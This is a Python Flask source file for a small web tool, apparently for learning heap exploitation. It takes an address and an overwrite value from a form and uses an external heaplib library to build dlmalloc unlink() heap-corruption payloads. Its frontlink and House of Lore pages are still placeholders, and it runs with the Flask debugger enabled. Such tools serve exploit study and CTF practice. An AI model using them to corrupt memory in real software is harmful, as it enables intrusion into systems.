from flask import Flask, url_for, request, render_template

app = Flask(__name__)

@app.route("/hello/")
@app.route("/hello/<name>")
def hello(name=None):
    return render_template('hello.html', name=name)

    #with app.test_request_context():
        #return "Index page that describes how to use the tool => " + url_for('unlink_method')

@app.route("/dlmalloc_unlink", methods=['GET', 'POST'])
def dlmalloc_unlink_method():
    if request.method == "GET":
        t = "dlmalloc unlink() method"
        return render_template("unlink_dlmalloc.html", title=t, heading=t)
    elif request.method == "POST":
        payload = dlmalloc_unlink(request)
        t = "Dlmalloc unlink payload"
        return render_template("payload.html", title=t, heading=t,
                               payload=payload)

@app.route("/frontlink")
def frontlink_method():
    return "Perform exploitation using the frontlink method"

@app.route("/ho_lore")
def ho_lore_url():
    return "House of Lore"

@app.route("/")
def root():
    t = "Assistive Heap Exploitation"
    return render_template("root.html", unlink_url=url_for('dlmalloc_unlink_method'),
                                        frontlink_url=url_for('frontlink_method'),
                                        ho_lore_url=url_for('ho_lore_url'),
                                        title=t, heading=t)



###################################################################
# VIEWS

from heaplib import *
import json

# Extract the data provided from the UI, craft the payload and
# send it back
def dlmalloc_unlink(request):
    payload = """
    prev = %s
    post = %s
    (PREV_SIZE_C, SIZE_C) = pack(%s), pack(%s)
    """
    hpc = HeapPayloadCrafter("dlmalloc",
                             int(request.form['address_to_overwrite'], 16),
                             int(request.form['value_to_overwrite'], 16),
                             pre_length=int(request.form['pre_length']),
                             post_length=int(request.form['post_length']),
                             pre_presets=json.loads(request.form['pre_presets']),
                             post_presets=json.loads(request.form['post_presets'])
                             )
    arch_bits = {"32": 0xffffffff, "64": 0xffffffffffffffff}
    bits = arch_bits[request.form['bits']]
    pre, metadata, post = hpc.generate_payload()
    payload = payload %(repr(pre), repr(post), hex(metadata[0] & bits), hex(metadata[1] & bits))
    return payload

if __name__ == '__main__':
    app.debug = True
    app.run()
